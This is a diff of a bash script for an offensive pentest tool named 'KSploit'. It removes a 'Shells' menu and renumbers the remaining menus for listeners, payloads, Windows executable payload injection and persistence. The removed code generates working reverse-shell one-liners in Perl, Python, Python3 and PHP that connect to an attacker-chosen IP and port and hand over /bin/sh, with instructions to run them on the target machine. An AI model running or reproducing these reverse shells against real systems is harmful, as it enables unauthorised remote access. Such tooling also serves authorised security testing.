@@ -132,124 +132,6 @@ badbye()
 }
 
 ################################################################################
-# Shells Menu
-################################################################################
-shells()
-{    
-clear
-echo ${YELLOW}"
-   ____  _          _ _     
-  / ___|| |__   ___| | |___ 
-  \___ \| '_ \ / _ \ | / __|
-   ___) | | | |  __/ | \__ \\
-  |____/|_| |_|\___|_|_|___/
-   🐚🐚🐚🐚🐚🐚🐚🐚🐚🐚🐚🐚                          
-	"${LIGHT_MAGENTA}
-   echo "  Use the shells menu to quickly and easily craft shell code and scripts. Choose from Bash, PERL, Ruby, PHP, python and necat options.  ${YELLOW}" |fmt -w 60
-   echo
-   pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
-   #shelly:
-   clear
-   echo ${YELLOW}
-   echo "	   _____________________________________________"
-   echo "	  |${FGG}       KSploit Shells Menu Options:          ${NC}${YELLOW}|"
-   echo "	  |---------------------------------------------|"
-   echo "	  |    🦪${GREEN} 1 ${BLUE}PERL shell script.                  ${YELLOW}|"
-   echo "	  |---------------------------------------------|"
-   echo "	  |    🐍${GREEN} 2 ${BLUE}Python shell script.                ${YELLOW}|"
-   echo "	  |---------------------------------------------|"
-   echo "	  |    🐍${GREEN} 3 ${BLUE}Python3 shell script.               ${YELLOW}|"
-   echo "	  |---------------------------------------------|"
-   echo "	  |    📈${GREEN} 4 ${BLUE}PHP shell script.                   ${YELLOW}|"
-   echo "	  |---------------------------------------------|"
-   echo "	  |    🚪${GREEN} q ${BLUE}To quit.                            ${YELLOW}|"
-   echo "	  |_____________________________________________${YELLOW}|"
-   echo
-   echo "     if you need an advanced php shell, go here:    "
-   echo "     https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell${GREEN}" |fmt -w 80
-   errors	
-   echo "${GREEN}"
-   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,q]    " opt
-   echo
-   echo
-   locals
-   case "$opt" in
-	1)
-	    touch $wdir/shell.pl
-            echo
-            echo "              ${FGC}   Crafting a PERL Shell script   :   ${NC}${YELLOW}"
-	    read -p '	    Set Attacker IP* ' attackerip
-    	    read -p '	    Set Attacker Port* ' attackerport
-  	    echo "	    🦪🦪🦪 Generating perl shell script ..."	
-	    echo -e "perl -e 'use Socket;\$i=\"$attackerip\";\$p=$attackerport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" > $wdir/shell.pl
-	    echo
-	    sleep 1		    
-  	    echo -e "         ${FGG}${YELLOW}   🦪🦪🦪   Perl Shell script saved to $wdir/shell.pl   🦪🦪🦪   ${NC}${YELLOW}"${GREEN}
-	    chmod +x $wdir/shell.pl
-	    echo	
-	    echo -e "or run ${FGC}${LIGHT_CYAN} perl -e 'use Socket;\$i=\"$attackerip\";\$p=$attackerport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' ${NC}${GREEN} on the target machine" 
-	    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
-            goto shelly;
-	  ;;
-	2)
-	    touch $wdir/shell.py
-		echo
-		echo "              ${FGC}   Crafting a Python Shell script   :   ${NC}${YELLOW}"
-	    read -p '	    Set Attacker IP* ' attackerip
-		read -p '	    Set Attacker Port* ' attackerport
-   	    echo "	    🐍🐍🐍 Generating python shell script ..."	
-	    echo -e "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerip\",$attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > $wdir/shell.py
-	    echo
-	    sleep 1		    
-  	    echo -e "         ${FGG}${YELLOW}   🐍🐍🐍   Python Shell script saved to $wdir/shell.py   🐍🐍🐍   ${NC}${YELLOW}"
-	    chmod +x $wdir/shell.py
-	    echo
-	    echo -e "         or run ${LIGHT_CYAN}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerip\",$attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'${GREEN} on the target machine" 
-	    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
-            goto shelly;
-	  ;;
-	 3)
-	    touch $wdir/shell3.py
-		echo
-		echo "              ${FGC}   Crafting a Python3 Shell script   :   ${NC}${YELLOW}"
-	    read -p '	    Set Attacker IP* ' attackerip
-		read -p '	    Set Attacker Port* ' attackerport
-   	    echo "	    🐍🐍🐍 Generating python3 shell script ..."	
-	    echo -e "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerip\",$attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > $wdir/shell3.py
-	    echo
-	    sleep 1		    
-  	    echo -e "         ${FGG}${YELLOW}   🐍🐍🐍   Python3 Shell script saved to $wdir/shell3.py   🐍🐍🐍   ${NC}${YELLOW}"
-	    chmod +x $wdir/shell3.py
-	    echo
-	    echo -e "         or run ${LIGHT_CYAN}python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerip\",$attackerport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'${GREEN} on the target machine" 
-	    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
-            goto shelly;
-	  ;;
-	4) 
-	    touch shell.php
-	    read -p 'Set Attacker IP* ' attackerip; read -p 'Set Attacker Port* ' attackerport
-	    echo -e "php -r '\$sock=fsockopen(\"$attackerip\",$attackerport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" > shell.php
-	    echo -e "${DG} - - - -> PHP Shell script saved to $wdir/shell.php"${GREEN}
-	    echo -e "or run ${LIGHT_CYAN}php -r '\$sock=fsockopen(\"$attackerip\",$attackerport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'${GREEN} on the target machine"
-	    echo "${LIGHT_MAGENTA}     if you need an advanced php shell, go here:    "
-	    echo "https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell${GREEN}"
-	    pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
-            goto shelly;
-	  ;; 
-         q)
-	    clear
-	    goto $start
-         ;;
- 	 *)
-	    clear 
-	    error="$opt is not a valid option!"      	
-	    goto shelly;
-	 ;;
-    esac
-
-}
-
-################################################################################
 # Payloads Menu
 ################################################################################
 payloads()
@@ -526,7 +408,7 @@ listeners()
    echo	
    errors
    echo "${GREEN}"
-   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,5,q]    " opt
+   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,q]    " opt
    echo
    echo
    locals
@@ -924,13 +806,11 @@ function pause(){
    echo "	  |---------------------------------------------|"
    echo "	  |    👂${GREEN} 1 ${BLUE}Listeners Menu.                     ${YELLOW}|"
    echo "	  |---------------------------------------------|"
-   echo "	  |    🐚${GREEN} 2 ${BLUE}Shells menu.                        ${YELLOW}|"
+   echo "	  |    💰${GREEN} 2 ${BLUE}Payloads menu.                      ${YELLOW}|"
    echo "	  |---------------------------------------------|"
-   echo "	  |    💰${GREEN} 3 ${BLUE}Payloads menu.                      ${YELLOW}|"
+   echo "	  |    💉${GREEN} 3 ${BLUE}Windows exe payload injection.      ${YELLOW}|"
    echo "	  |---------------------------------------------|"
-   echo "	  |    💉${GREEN} 4 ${BLUE}Windows exe payload injection.      ${YELLOW}|"
-   echo "	  |---------------------------------------------|"
-   echo "	  |    ⌛${GREEN} 5 ${BLUE}Persistence Scripts menu.           ${YELLOW}|"
+   echo "	  |    ⌛${GREEN} 4 ${BLUE}Persistence Scripts menu.           ${YELLOW}|"
    echo "	  |---------------------------------------------|"
    echo "	  |    ▶️ ${GREEN} M ${BLUE}Migrate to Msfconsole.              ${YELLOW}|"
    echo "	  |---------------------------------------------|"
@@ -941,17 +821,15 @@ function pause(){
    echo ${NC}
    errors
    echo "${GREEN}"
-   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,5,M,q]    " opt
+   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,M,q]    " opt
    case "$opt" in
        1) listeners
          ;;
-       2) shells
+       2) payloads
          ;;
-       3) payloads
+       3) malexe
          ;;
-       4) malexe
-         ;;
-       5) persist
+       4) persist
          ;;
        M) mfconsole
          ;;
